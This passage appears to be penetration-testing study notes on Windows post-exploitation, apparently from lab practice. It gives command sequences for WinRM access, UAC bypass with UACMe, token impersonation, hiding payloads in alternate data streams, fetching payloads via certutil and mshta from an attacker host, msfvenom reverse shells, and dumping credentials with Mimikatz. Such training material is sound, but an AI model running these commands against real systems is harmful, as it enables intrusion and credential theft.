- Note: Bundler  is a dependency management tool for Ruby applications that's included by default in Ruby version 2.6 and later. Use `gem install bundler` to install bundler for earlier versions of Ruby.

##### Running Evil-WinRM

Use `evil-winrm` if you used RubyGems install or `evil-winrm.rb` if you pulled from the Github repository. The following command would start an interactive PowerShell session on the target Windows machine to allow remote command execution:

```
evil-winrm.rb -u <username> -p "<password>" -i <target>
```
- `-u`= Username
- `-p` = Password
- `-i` = Target

**Example:** 

```
evil-winrm.rb -u administrator -p "pqaeoirgq" -i 10.52.6.4
```

### Exploitation of WinRM using Metasploit

We can use the winrm_script_exec exploit module (`exploit/windows/winrm/winrm_script_exec`) for exploiting WinRM, you would need to have valid credentials for this to work so enumeration/brute force would be necessary first.

By default the payload will be `windows/meterpreter/reverse_tcp` which is 32-bit and fine here. Need to set the target `RHOSTS` , set the `FORCE_VBS` for the VBS CmdStager to true and then set the `USERNAME`/`PASSWORD`.  The `RPORT` will already be set to 5985 by default.  A **VBS cmdstager** is a the tool will generate and execute commands written in VBScript on a Windows machine to download, write, and execute a payload in stages. This is often used in scenarios where direct execution of a large payload isn't feasible, so the payload is staged and executed via small script commands.

```
service postgresql start && msfconsole
use exploit/windows/winrm/winrm_script_exec
set RHOSTS 10.52.63.52
set FORCE_VBS true
set USERNAME administrator
set PASSWORD wifpoeij
exploit
```

Upon successful exploitation, After exploitation, the module will attempt to migrate the Meterpreter session to a system-level process (e.g., `services.exe`, `wininit.exe`, `svchost.exe`) for more stability and to obtain higher privileges, aiming to achieve a session as `NT AUTHORITY\SYSTEM`.

# Windows-Privilege-Escalation

### Privilege Escalation

Privilege escalation involves taking advantage of system vulnerabilities or misconfigurations to increase a user's access level, typically elevating from a standard user to one with administrative or root privileges. It is a crucial part of the attack lifecycle and directly impacts the success of penetration testing. Once an initial foothold is gained on a system, escalating privileges is necessary to perform tasks requiring administrative access such as data exfiltration or pivoting. 

#### Windows Kernel

A kernel is a program that's the core of an operating system, responsible for controlling hardware and system resources. It acts as a translation layer between hardware and software, facilitating communication between the two layers. Windows NT is the kernel pre-packaged with Windows and operates in two main modes that determine access to system resources:
- **User Mode** – Programs and services running in user mode have limited access to system resources and functionality. Third-party applications/program 
- **Kernel Mode** – Kernel mode allows unrestricted access to system resources, including the ability to manage hardware, devices, and system memory. The kernel is often targeted as code executed in the kernel space will be executed with the highest privileges available.

#### Windows Kernel Exploitation

Kernel exploits on Windows usually target vulnerabilities in the Windows kernel to execute arbitrary code, allowing attackers to run privileged system commands or gain access to a system shell. The approach varies depending on the Windows version and the specific kernel exploit used. Kernel exploit is not recommended in most environments since it can lead to crashing the system. The typical process for privilege escalation on Windows involves:

1. Identifying kernel vulnerabilities.
2. Downloading, compiling, and transferring kernel exploits to the target system.


**Windows-Kernel-Exploits** - Collection of Windows Kernel exploits sorted by CVE.  
+ GitHub: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-

---

#### Metepreter `getsystem` command

In a Meterpreter session, the `getsystem` command is used to elevate privileges on the compromised machine to the highest possible level—typically, the _SYSTEM_ account on Windows systems.  When you run the command, Meterpreter tries various built-in privilege escalation techniques to elevate privileges. Here are a couple of common methods it employs:
- **Named Pipe Impersonation** - This technique leverages the ability to impersonate tokens from privileged processes. Windows services often use named pipes for inter-process communication, and in some cases, a low-privileged process can access pipes from a higher-privileged service. By hijacking these pipes and impersonating the tokens, `getsystem` can elevate the session to SYSTEM privileges. 
- **Token Duplication**: This technique involves duplicating an access token associated with a process that already has SYSTEM privileges. If a process with these privileges is running, `getsystem` can try to copy its token and use it to escalate privileges.

#### Metasploit Local Exploit Suggester

Metasploit has a post exploitation module 'local_exploit_suggester'  that can look for vulnerabilities pertinent to a version of a windows/linux operating system. This is post exploitation as the module requires a meterpreter session of a compromised system:

1. **Find/Use the module**: You can either search Metasploit for `suggester` or use the module  `post/multi/recon/local_exploit_suggester`.
```
search suggester

use post/multi/recon/local_exploit_suggester
```

2. **Configure the module**: You need to specify the meterpreter session that you want to run the module on with the `SESSION` option. You can confirm sessions using the background sessions you have with the `sessions` command.
```
set SESSION 2
```

3. **Run the module**: This will enumerate the vulnerabilities and display any local metasploit modules that could be used for privilege escalation. 
```
run
```

**Note: Make sure to research the found exploits to confirm what the exploit does and if its applicable to the version of the operating system.**


#### Manual Privilege Escalation

**Windows-Exploit-Suggester** - This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins. <u>This repo has been archived and hasn't been actively maintained since July 2023</u>.

+ GitHub: https://github.com/AonCyberLabs/Windows-Exploit-Suggester

1. **Export contents of `systeminfo` to a file**: The information from the `sysinfo` needs to be saved since there's hotfixes applied to the system where the suggester will use to find vulnerabilities for. Either copy-paste the output to a txt file or use a redirect to output it to a file
```
systeminfo > output.txt
```

2. **Download the Windows Exploit Suggester zip**:  You can find the URL to download the zip from the Github repo
```
curl -L https://github.com/AonCyberLabs/Windows-Exploit-Suggester/archive/refs/heads/master.zip -o suggester.zip
```
- The `-L` (or `--location`) option in `curl` tells it to follow redirects. When you make a request to a URL that responds with an HTTP redirect (3xx status code) curl by default does **not** follow the redirection to the new location. The `-L` option tells `curl` to automatically follow the redirection and retrieve the content from the final location. This is useful when downloading files from URLs that might redirect to a different download location.

3. **Extract the zip download:** You can use powershell's built-in cmdlet  `Expand-Archive` to extract ZIP files:
```
Expand-Archive -Path .\original.zip -DestinationPath .\destination-folder
```

4. **Download the updated MS Vuln Database:** Run the suggester script with the `--update`' to pull the updated database. This should output an .xls file of the database like `2023-06-02-msb.xls` which is dated to the time the command was ran.
```
.\windows-exploit-suggester.py --update
```
5. **Run suggester**: You need to specify `--database` which is the MS vulnerability database xls file and `--systeminfo` which is set to the location of the txt file for the systeminfo command. The output will have the vulnerabilities most likely to work on the system at the top. Prioritize exploits that provide privilege escalation.
```
.\windows-exploit-suggester.py --database 2023-06-02-msb.xls --systeminfo win7.txt
```

### Windows Kernel Exploits
Note: For Windows Kernel Exploits SecWiki's Github is recommended.
https://github.com/SecWiki/windows-kernel-exploits/

Can navigate to the Temp directory on the Windows system which should be on the root of the C:\  Drive

```
meterpreter> upload file.exe
```

From the session, run the exe exploit.

### UAC

User Account Control (UAC) is a Windows security feature that prevents unauthorized changes to the operating system by requiring administrator approval for elevated actions. Non-privileged users will be prompted to provide administrative credentials to perform the action, while privileged users willl be prompted with a Yes/No consent before continuing. Attacks can attempt to bypass UAC to execute malicious software with elevated privileges.
##### Bypassing UAC

<u>To bypass UAC, access to a user account within the local administrators group of the target system is required</u>. UAC prompts users to confirm or provide credentials before granting administrative privileges.

UAC has integrity levels ranging from low to high, if the UAC protection level is set below "high," some programs can run with elevated privileges without prompting the user. So, for example, if we create a meterpreter payload with msfvenom payload and have it successfully uploaded/executed on the target with administrative privileges, we would then bypass UAC without the need for the consent prompt.

There are various tools and methods to bypass UAC, but the choice of technique depends on the version of Windows and the UAC integrity level configured on the target system.
#### UACMe

UACMe is an open-source privilege escalation tool developed by @hfire0x, designed to bypass Windows User Account Control (UAC) and gain elevated privileges on Windows systems. It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt Window AutoElevate tool. The UACMe GitHub repository includes various methods for bypassing UAC, applicable to multiple Windows versions from Windows 7 to Windows 10.  To use UACMe, you need to compile the source code in the 'Source' directory which contains C code.
- GitHub: https://github.com/hfiref0x/UACME

To make UCAMe work to bypass UAC we'll need the following: 
- x86-32/x64 Windows 7/8/8.1/10/11 client (some methods however works on server version too).
- Admin account with UAC set on default settings required.

**Default UAC Description:**

"Notify me only when apps try to make changes to my computer (default)"

```
- Notify you when programs try to install software or make changes to your computer
    
- Not notify you when you make changes to Windows settings
    
- Freeze other tasks until you respond
```
##### Bypassing UAC Steps with UACMe 
1. Compile the UACMe akagi32/akagi64 source code to an executable.
2. Gain initial access to a system to get a meterpreter session
3. Upload the meterpreter payload and akagi executable to the target
4. Run the payload with Akagi to bypass UAC and get elevated meterpreter session

---
1. <u>Gain Initial Access on the target</u>: Run an initial Nmap scan and try to exploit any service. We'll use the meterpreter session to view the initial privileges and upload the payload/akagi executables to the target.

**Useful Meterpreter Commands/Tips:**
- Get current user => `getuid`
- Check the current user's privileges => `getprivs`
- If you have a x86 meterpreter session, you can migrate to the explorer process which should give you that x64 session.
```
meterpreter> pgrep explorer
2342
meterpreter> migrate 2342
```

**Windows Commands:**
- View users => `net user`
- Check the local administrator group => `net localgroup administrators` | Make sure the current user you're using is in this group

In the shell session, you'll receive an "`System error 5 has occured. Access is denied` " since we'd need to respond to the UAC consent prompt which can't be done through the shell unless you bypass UAC.

---
2. <u>Create the metepreter payload with msfvenom and start a listener with multi handler</u>: We're creating the msfvenom payload because the initial Meterpreter session may lack high privileges or is unstable. Running the payload with UACMe will elevate the meterpreter session's privileges, ensuring the new payload establishes a fully privileged and hopefully more stable session. 
```
msfvenom -p payload LHOST=atk_machine LPORT=l_port -f file_type > file_name
```

Example:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.41.59 LPORT=2345 -f exe > backdoor.exe
```

Start another metasploit instance (`service postgresql start && msfconsole`) and use `multi/handler` to listen for the connection from the  payload.

- **Use/configure the module**: Set the configured payload to the one set from msfvenom. Next, we'll also need to set the `LHOST`/`LPORT` to the same one specified in the payload:
```
msf6> use multi/handler

msf6> set payload windows/meterpreter/reverse_tcp

msf6> set LHOST 10.10.41.59

msf6> set LPORT 2345
```
- **Run the module**: This will start the listener. When the payload is executed on the target it will connect back here.
```
msf6> run
```

---
3. <u>Upload the executables to the target</u>: Use the initial meterpreter/shell session to upload the reverse shell payload and akagi executable. It's recommended to have a Temp directory on the root of the C: drive to upload the payload to, so navigate/create the directory on the target.

```
meterpreter> cd C:\\
meterpreter> mkdir Temp
meterpreter> cd Temp\\
```

- Use the `upload`command to push the backdoor executable to the target.
```
meterpreter> upload backdoor.exe
```

- Next, upload the Akagi executable to the target
```
meterpreter> upload UACME/Akagi64.exe
```

4. <u>Run Akagi with the payload </u>: If you try to just run the payload backdoor now, UAC will prevent the execution. We'll run akagi with the payload. UACMe uses an akagi32/akagi64 executable which you need to specify a `Key` which is the number of method to use and then a `Parameter` which is the path to the payload executable you want to execute.  Look into the 'Keys' section listed in the description of the Github repository. Method 23 is recommended on windows 10 systems but doublecheck to see which Keys were fixed/patched. The execution of the executable should bypass UAC. Try to locate methods that work for the target operating system and hasn't been listed as fixed.
```
akagi_exe [method_num] payload_location
```

Example:
```
.\Akagi64.exe 23 C:\Temp\backdoor.exe
```

This will run the payload bypassing UAC, you can check the listener to see the new meterpreter session being setup.

You should be able to run `ps` on the new meterpreter session to view the services on the target system, you should be able to migrate to any of these services, particularly any services running `NT AUTHORITY\SYSTEM` which would then escalate your privileges. If you migrated to one of these services running NT AUTHORITY\SYSTEM, you should have the permission to  perform actions like dumping NTLM hashes using something like Kiwi. In Metasploit, `kiwi` is an extension of **Meterpreter** that provides credential extraction capabilities similar to Mimikatz. 

- **Load the Kiwi extension**
```
meterpreter> load kiwi
```
- **Run the 'lsa_dump_sam' command**: The`lsa_dump_sam` is a command in the Kiwi extension (or Mimikatz) that extracts NTLM and LM password hashes for local users from the Security Account Manager (SAM) database. The hashes are pulled directly from memory, bypassing file locks. The hashes should be outputted, this will be the same if you did this with Mimikatz:
```
meterpreter> lsa_dump_sam
```
- **View the Hashes**: The hashes should also display after running the `lsa_dump_sam` command but can also run `hashdump` which would display the same hashes:
```
meterpreter> hashdump
```


---

### Windows Access Tokens

A Windows access token is a core element of the authentication process, identifying the security context of a process or thread and acting like a temporary key that grants access to system or network resources without requiring credentials for each access. 

Access tokens are created and managed by both **LSASS (Local Security Authority Subsystem Service)** and **winlogon**, but each plays a distinct role. LSASS handles the overall security policy and creates tokens for security operations, including non-interactive logons and background processes. The **winlogon** generates access token for interactive logon when a user successfully authenticates. Winlogon handles the sign-in prompt when you login into the computer. These tokens contains the identity and privileges of the user account which are then attached to the **userinit.exe** process to ensure all child processes started by the user will inherit a copy of the same token. This allows the processes to run with the same privileges as the authenticated user.

Access tokens essentially are used to restrict what users can/cannot execute. Windows access tokens are categorized by security levels, which determine their assigned privileges.
- **Impersonate-level tokens** result from non-interactive logins typically through  system services or domain logons and allow impersonations only on the local system.
- **Delegate-level tokens** come from interactive logins like traditional logins or RDP and pose a greater risk since they can impersonate tokens across multiple systems.

The ability to impersonate access tokens for privilege escalation depends on the privileges of the compromised account and the available impersonation or delegation tokens. Key privileges required for a successful impersonation attack include:
- **SeAssignPrimaryToken**: Allows user to impersonate tokens
- **SeCreateToken**: Allows creation of arbitrary tokens with administrative privileges.
- **SeImpersonatePrivilege**: Permits creating processes under another user's security context, often with administrative access. This privilege is especially important.
#### Incognito

The Incognito module, originally a standalone application, is now integrated into Meterpreter. It allows impersonation of user tokens after successful exploitation. This module can also display a list of tokens available for impersonation.

1. <u>Initial Access:</u> Perform an nmap scan on the system and then try to exploit any services on an open port to get a meterpreter session.

2. <u>Check Privileges</u>: Can confirm the current user with `getuid` and then check their privileges with `getprivs`. Make sure it has at least of one the three privileges:
	- **SeAssignPrimaryToken**
	- **SeCreateToken**
	- **SeImpersonatePrivilege**

3. <u>Load Incognito</u>: Load the incognito extension from the meterpreter session.
```
load incognito
```

4. <u>View Access Tokens</u>: Run `list_tokens` to view the available access tokens. Note any potential admin accounts
```
list_tokens -u
```

5. <u>Impersonate a Token</u>: Use `impersonate_token` for the actual impersonation, copy/paste the admin user within quotes.
```
impersonate_token "ATTACKDEFENSE\Administrator"
```

6. (**Optional) Rinse and Repeat**: If you successfully impersonated an administrator, you'll likely have more access tokens available like `NT AUTHORITY \ SYSTEM` which you could try to impersonate again.

###### NOTE: You'll be in a situation where there's no delegation or impersonation access tokens available. In this case, you'll need a potato attack to generate a NT AUTHORITY \ SYSTEM access token to impersonate it.


### Alternate Data Streams (ADS)

Alternate Data Streams (ADS) is a file attribute of the NTFS (New Technology File System) designed to provide compatibility with the MacOS HFS (Hierarchical File System). Every file on an NTFS-formatted drive contains two streams:

- **Data stream**: The primary stream holding the actual content of the file.
- **Resource stream**: A secondary stream used to store metadata, which can also contain additional hidden data.

An ADS can hold executable code or other payloads within the resource stream of an otherwise legitimate file. Attackers use this feature to conceal malicious content, making it harder to detect with conventional signature-based antivirus tools and static scanners. This technique allows malicious payloads to remain hidden while appearing as benign files.

#### Creating and Accessing Alternate Data Streams

To store or access data in a resource stream, a colon (`:`) is used to specify the alternate stream within the file.

```
test.txt:secret.txt
```

This command opens the **`secret.txt`** file hidden within the **resource stream** of `test.txt`. The hidden stream will not be visible through normal file listings, adding another layer of stealth.

#### Redirecting a Payload into a Resource Stream

Attackers can redirect malicious executables or payloads into the resource stream of legitimate files to evade detection. The `type` command can transfer the contents of a payload into the resource stream of a file.

```
type payload.exe > windowslog.txt:winpeas.exe
```

To make the log file look legitimate, you could add content to the primary stream using Notepad:
```
notepad windowslog.txt
```

The hidden payload can then be executed directly from the resource stream:
```
start windowslog.txt:winpeas.exe
```

#### Using Symbolic Links with ADS

Attackers can also use symbolic links to disguise or redirect access to the hidden payloads within resource streams. A symbolic link is a pointer that refers to a file or directory elsewhere, further obfuscating malicious activity.

Example of creating a symbolic link within the `C:\Windows\System32` directory:

```
mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
```

When the link, which is `wpdate.exe` here, is executed from the command line, it triggers the hidden payload:

```
wupdate
```

# Windows-Credential Dumping


**Windows Password Hashes**

Windows stores hashed passwords locally in the SAM (Security Accounts Manager) database. Hashing is the process of converting a piece of data using a hashing function/algorithm into another new value called a hash or hash value.  In the early 2000s the encryption process was revised so that the password string provided would be automatically hashed and stored to prevent keeping clear-text passwords. Authentication would be compared to the hashed password.

The Local Security Authority (LSA) manages the verification process which is tied to the LSASS process. Older Windows versions (up to Server 2003) used two types of hashes: LM and NTLM. However, starting from Windows Vista, LM hashing was disabled, with NTLM becoming the default. Very unlikely to see LM hashing in the wild.

**SAM Database**

The SAM is a database file that's responsible for managing user accounts and passwords on Windows systems. Windows has a security feature which prevents the SAM database file from being copied while the operating system is running.

With the SAM database file being locked by the Windows NT kernel,  attackers would typically utilize memory techniques/tools like Mimikatz to dump SAM hashes from the LSASS process.  Elevated/Administrative privileges are required to interact with the LSASS process.

In modern versions of Windows, the database is encrypted with a syskey.

**LM Hashing**

LM (LanMan) was the default hashing algorithm used in Windows operating systems prior to NT4.0 but is considered weak today. It splits passwords into two seven-character chunks, converts them to uppercase, and hashes each with DES. LM hashing lacks salts, making it vulnerable to brute-force and rainbow table attacks, which can easily crack the passwords. LM Hashing is disabled from Windows Vista and onwards.

```
Password123 -> PASSWO + RD123 -> DES -> LM_HASH1+LM_HASH2
```

**NTLM Hashing**

NTLM is a more secure authentication protocol used from Windows Vista onwards replacing LM hashing. When a user account is created, it encrypts the passwords using the MD4 hashing algorithms while disposing the original clear-text password.  NTLM offers improvements over LM, such as case sensitivity, not splitting the hash, and supporting symbols and Unicode characters, making it harder to crack.

```
!PassW0RD321@ -> MD4 -> NTLM hash
```

##### Windows Configuration Files  

Windows can automate repetitive tasks, like mass installations, using the Unattended Windows Setup utility. This tool relies on configuration files that specify system settings and store credentials, including the Administrator password. If these files remain on a system after installation, they could expose credentials, allowing attackers to authenticate and access the system.

**Unattended Windows Setup**  
The Unattended Windows Setup utility uses the following configuration files that contain user account and system config information:
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Autounattend.xml`
For security, any passwords within these files may be encoded in base64.

### Search For Passwords in Windows Config Files / Unattended Installation

Exploitation Steps:
1. First gain initial access into the system with a meterpreter session
2. Next, use the meterpreter session to find the unattended xml file
3. Identify the password and decode it with a base64 utility.
4. Authenticate with the target with PsExec

##### Generate a meterpreter payload using MSFVenom

MSFVenom is used for generating payloads for a reverse shell.
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.66.82 LPORT=4321 -f exe > payload.exe
```
- `-p` = Payload
- `-LHOST`/`LPORT` = Attack machine's IP and port
- `-f` = file type

##### Host a website for the payload.exe

We'd normally try to establish initial access by exploiting a service but we can run the built-in Python module `SimpleHTTPServer` to quickly launch an HTTP server to serve files from a directory containing the payload that can be downloaded to the target. Simply run it in the target directory, and it will host the contents over HTTP on the specified port.

```
python -m SimpleHTTPServer 80
```

You can use the `certutil` command on the windows system to download the payload.
```
certutil -urlcache -f http://<server_ip>/payload.exe payload.exe
```

Use could try to use meterpreter's in-built search to search for the type of files you're interested in.

```
search -f <file>.txt
```

Look for `<AutoLogon>` tag, this should have hard-coded credentials. We'd know any password is encoded if the `<PlainText>` tag is set to false.

```
<AutoLogon>
	<Password>
		<Value>QWRtaW5AMTIz</Value>
		<PlainText>false</PlainText>
	</Password>
	<Enabled>true</Enabled>
	<Username>administrator</Username>
</AutoLogon>
```

Use kali's base64 decoder to extract the credentials. You can output using `-o` to a file if you'd like:

```
base64 -d password.txt 
```

The password could be used through something like PsExec
#### Psexec Python Script

Psexec is a windows executable which can't be ran on a Linux system. We can use the `psexec.py` which is a python implementation of the software. 

```
psexec.py Username@Target <cmd_to_execute_on_system>
```
Example: You can run psexec.py against the target and try to execute a shell using cmd.exe:
```
psexec.py Administrator@10.63.45.88 cmd.exe
```


### PowerSploit to find Unattended Installation files

**PowerSploit** is a collection of Microsoft PowerShell modules designed to assist penetration testers during all phases of an assessment. One of these modules, **PowerUp.ps1**, focuses on identifying common Windows privilege escalation vectors that exploit misconfigurations. We will run the PowerUp.ps1 script to detect potential privilege escalation vulnerabilities on the system.
- **Github**: https://github.com/PowerShellMafia/PowerSploit

1. Navigate to the PowerUp Script:
```
..\PowerSploit\Privesc\
```

2. <u>Starts a new PowerShell session with the execution policy set to "bypass"</u>: Normally, PowerShell enforces an execution policy to prevent untrusted scripts from running (like "Restricted" or "RemoteSigned"). Setting the execution policy `-ep`  to bypass tells PowerShell to ignore those restrictions just for this session, allowing any script to run freely.
```
powershell -ep bypass
```

3. <u>Import the PowerSploit PowerUp script</u>: Importing the PowerSploit script makes its functions and variables available for use. The dot-sourcing operator **(`.`)** makes sure the script runs in the **current session**, not a new one, allowing its contents to stay in memory and be directly accessible whenever needed throughout the session. Without dot-sourcing, the script would run in isolation, meaning functions like `Invoke-PrivescAudit` wouldn’t be available once the script finishes.
```
. .\PowerUp.ps1
```

4. <u>Run the PrivescAudit function</u>:  The `Invoke-PrivescAudit` function defined within the PowerUp.ps1 script that runs the privilege escalation audit, scanning for misconfigurations like vulnerable services or weak file permissions. Since the script was dot-sourced, this function is now available in the current PowerShell session.
```
Invoke-PrivescAudit
```

The output should find any vulnerabilities like a **Unattend.xml** file present on the system. Open the **Unattend.xml** file.
```
cat C:\Windows\Panther\Unattend.xml
```

 Decoding administrator password using Powershell.
 
```
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
ssword))
echo $password
```

Breaking down..... 

```
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
ssword))
```

1. `[System.Convert]::FromBase64String(<base64_password>)`: The base64 string is a textual representation of binary data. To retrieve the original password, we first need to decode it into its binary form.  The `System.Convert` .NET class provides methods for data type conversions, and here we use its `FromBase64String` method to convert the base64 string into a byte array, which represents the raw binary data. Since the byte array is not really human-readable, it must be further processed.

2. `[System.Text.Encoding]::UTF8.GetString(<binary_btye_array>)`: To convert the binary data into a readable format, we use the `System.Text.Encoding` .NET class, which handles character encoding and decoding. Specifically, the `UTF8.GetString` method translates the byte array into a UTF-8 encoded string. UTF-8 is a widely used character encoding standard in PowerShell, ensuring that the decoded string is properly interpreted as human-readable text. 

We can ran a command prompt as an administrator user using discover credentials.

```
runas.exe /user:administrator cmd
```

 We can now pretty much do whatever we want to leverage the administrative credentials to escalate privileges and gain an elevated Meterpreter session.  One option we can try is a hosted hta file to gain a meterpreter session.

##### mshta.exe and an HTA Payload to Gain a Meterpreter Session

Microsoft's HTML Application host aka `mshta.exe` is a Microsoft binary designed to execute HTML-based applications (HTA files).  HTA files can run embedded code hidden within the file, like powershell, which executes when the application runs. We can use `mshta.exe` with an HTA file to gain a Meterpreter session since 1.) `mshta.exe` is a legit component of the Windows which could evade detection by antivirus solutions making it a Living off the Land/LOLBin tactic and 2.) `mshta.exe` bypasses PowerShell's execution policy restrictions that block untrusted scripts allowing the embedded PowerShell commands from the HTA file to run.

We can use the hta_server module in Metasploit (`exploit/windows/misc/hta_server`) to host and serve a HTA file which would allows the payload to be delivered over the network.

```
use exploit/windows/misc/hta_server
set SRVHOST <attack_ip>
exploit
```

Once the exploit is started, it will generate a host HTA link (e.g., `http://10.10.31.2:8080/Bn75U0NL8ONS.hta`) that a target only needs to visit once which would execute the embedded powershell commands of the HTA payload and establish a meterpreter session. In this case, we can run mshta.exe through the elevated cmd prompt. 

```
mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta
```

Since the command prompt was launched with administrator privileges, any subsequent process like the  `mshta.exe` process running the hta payload will inherit the same elevated privileges. So the resulting Meterpreter session will have administrator-level access. 

**Helpful Meterpreter Windows OS Tips**

- Get to root directory -> `cd /
- Navigate to a directory -> `C:\\Users\\Administrator\\Desktop`
- List contents of a directory -> `dir`
- Open contents of a txt file -> `cat <file_name>`

---

## Dumping Hashes with Mimikatz/Kiwi


Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi) that allows for the extraction of clear-text passwords, hashes and Kerberos tickets from memory through lsass.exe. The lsass process is involved with authenticating users and part of the process involves interacting with the SAM database. The SAM (Security Account Manager) database, is a database file on Windows systems that stores hashed user passwords. Lsass will cache credentials retrieved from the SAM database and Mimikatz will extract hashes from the lsass.exe process memory.

We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi. In Metasploit, `kiwi` is an extension of Meterpreter that is essentially a Metasploit implementation of Mimikatz.

Mimikatz will require elevated privileges in order to run correctly since the Lsass process runs under privilege SYSTEM account.

#### Exploitation Process

We'll exploit the server, then dump the hashes with mimikatz/kiwi and then either collect the hashes to be cracked laster or use the hash to perform a pass-the-hash attack by authenticating legitimately  to a service.

#### Gaining Initial Access on Target

Run an initial Nmap scan and try to exploit any service. We'll use the meterpreter session to view the initial privileges and upload the payload/akagi executables to the target.

1. **Start postgresql and  metasploit**
```
service postgresql start && msfconsole
```
 2. **Run an exploit to get a meterpreter session on the target**: This is an example exploiting BadBlue which is a lightweight web server software originally created for file sharing and web hosting on Windows systems. Although it was once popular for these purposes, BadBlue is now considered outdated, and its security flaws have made it a target for exploitation. One of the most serious vulnerabilities in older versions of BadBlue is a buffer overflow exploit that enables remote code execution.  The Metasploit module `exploit/windows/http/badblue_passthru` targets a vulnerability in older versions of BadBlue (2.7 and earlier), exploiting a flaw in the `Passthru.dll` component which handles user input and passes it to system commands. By sending malicious HTTP requests, we can execute arbitrary commands and gain remote shell access with the same privileges as the web server, without needing valid credentials. For the exploitation module,  you would just configure the  `RHOSTS` (The target IP). You can update the meterpreter payload (optional) should get a `windows/meterpreter/reverse_tcp` payload by default.
```
use exploit/windows/http/badblue_passthru
set RHOSTS 10.61.25.84
exploit
```

3. **Find and migrate to the LSASS process**:  When connected to a Meterpreter session, you're generally tied to the process or service that was exploited and the  `migrate` command in Metasploit allows us to move the Meterpreter session to another process.   LSASS (Local Security Authority Subsystem Service) is a crucial process in Windows responsible for enforcing security policies, handling password changes, and managing stored credentials, including NTLM hashes. Migrating to the LSASS process allows us to extract credentials like NTLM hashes from memory while also granting higher privileges. To use `migrate`, we need to specify process by providing its PID (process ID). We would need to already be an administrator account to be migrate to any process. To find the PID for the service, we can use the `pgrep` command and just search the service's name. The `pgrep` command is a Unix-based utility only natively available on Linux/Mac , however, `pgrep` becomes available as a Meterpreter command when you're working with a compromised Windows system.

- **Use pgrep to get the PID**
```
meterpreter> pgrep lsass
```
- **Migrate to the LSASS service using that PID**
```
meterpreter> migrate 678
```

We should now have NT AUTHORITY\SYSTEM privileges, we can dump the hashes

**Useful Meterpreter Commands:**
- Get General System Info = `sysinfo`
- Get user ID = `getuid`
#### Option 1: Dumping Hashes with Kiwi Extension

In Metasploit, `kiwi` is an extension of **Meterpreter** that provides advanced credential extraction capabilities. It is essentially a Metasploit implementation of **Mimikatz**,  which is a well-known tool for extracting credentials from Windows systems. Run Kiwi to get the NTLM Hashes:

1.  **Load the Kiwi extension**
```
meterpreter> load kiwi
```
- Note: You can view all of the new available kiwi commands from the `help` menu

**Dumping hashes** = `lsa_dump_sam`: The lsa_dump_sam command  extracts NTLM and LM password hashes for local users from the cached contents of the SAM database. The hashes are pulled directly from memory, bypassing file locks. The hashes should be outputted, this will be the same if you did this with Mimikatz.  lsa_dump_sam should also return the syskey that's used to encypt the SAM database and a SAMkey. This could be useful later.
```
meterpreter> lsa_dump_sam
```
#### Other Useful Kiwi Commands

- **Dump Secrets** = `lsa_dump_secrets` =  Can return some clear text passwords in some cases
- **Change a Password** = `password_change` = You have the ability to change a password but its not recommended during a pentest as these can be used in a production environment.
- **Getting any creds it can find** =  `creds_all` = This cmd can return hashes/kerberos tickets etc. Windows 8.1+ doesn't store cleartext passwords so the Password fields will likely return `null`

**View the Hashes**: The hashes should also display after running something like `lsa_dump_sam`  but can also run `hashdump` which would display the same hashes:
```
meterpreter> hashdump
```

The output should be structured like this....
```
username : SID : LM_hash : NTLM_hash
```

We'll need to copy both the LM hash and the NTLM hash since certain exploits like the metasploit Psexec module requires both.

#### Option 2: Dumping Hashes with Mimikatz Executable

Upload the mimikatz to the target using the meterpreter/shell session, and then start mimikatz

1. **Create a Temp directory**:  It's recommended to have a Temp directory on the root of the C: drive to upload the payload to, so navigate/create the directory on the target. 
```
meterpreter> cd C:\\
meterpreter> mkdir Temp
meterpreter> cd Temp\\
```

2. **Upload the mimikatz executable**: Use the `upload` command to push mimikatz exe to the target. Metasploit has a 32-bit & 64-bit mimikatz exe available to upload such as `/usr/share/windows-resources/mimikatz/x64/mimikatz.exe`.
```
meterpreter> upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

3. **Start Mimikatz**: First start the shell session using `shell` so you can run the executable. Then execute mimikatz:

```
meterpreter> shell

C:\Temp> .\mimikatz.exe
```

4. **Check privileges**:  Running `privilege::debug` ensures Mimikatz has the necessary permissions to execute its functions. If you get a "Privilege '20' Ok", then you have the necessary permissions.
```
mimikatz # privilege::debug
```

5. **Dump the hashes:** Run the `lsadump::sam` command to dump the NTLM hashes. This is provide a little more information than the kiwi extension.
```
mimikatz # lsadump::sam
```

##### Other Mimikatz Options

- `lsadump::secrets` = This is equivalent of the `lsa_dump_secrets` kiwi command which might show clear text passwords.
- **Display Logon Passwords**: Whenever a user logons to a windows systems if the system is configured to store logon passwords in cleartext then Mimikatz can display these logon passwords. You can run the `sekurlsa::logonpasswords` command for displaying the passwords but note that the passwords would likely be set to `(null)` if clear text isn't configured for the system
```
mimikatz # sekurlsa::logonpasswords
```

## Pass the Hash

Pass-the-hash is an exploitation technique to capture NTLM hashes or clear-text passwords and utilizing them to authenticate against a target system legitimately.  Rather than exploiting services directly, this method leverages legitimate credentials to gain access to the system.

If you successfully obtain administrative access on a Windows target system, there's no need to re-authenticate to access the same Meterpreter session or reverse shell with administrative privileges. Even if the vulnerable service is patched, disabled, or blocked by a firewall rule, you can still regain access using the captured administrative hash. The hash allows you to access the system whenever you want, making this a form of persistence. Essentially, with the hash, you bypass the need to rely on the previously exploited service for continued access.

##### Performing the Pass-the-Hash Attack

Now we can used the captured NTLM hashes to authenticate with the target legitimately to the service/system.  Tools like the Metasploit PsExec module and CrackMapExec can be used to carry out this type of attack:

##### Metasploit PxExec
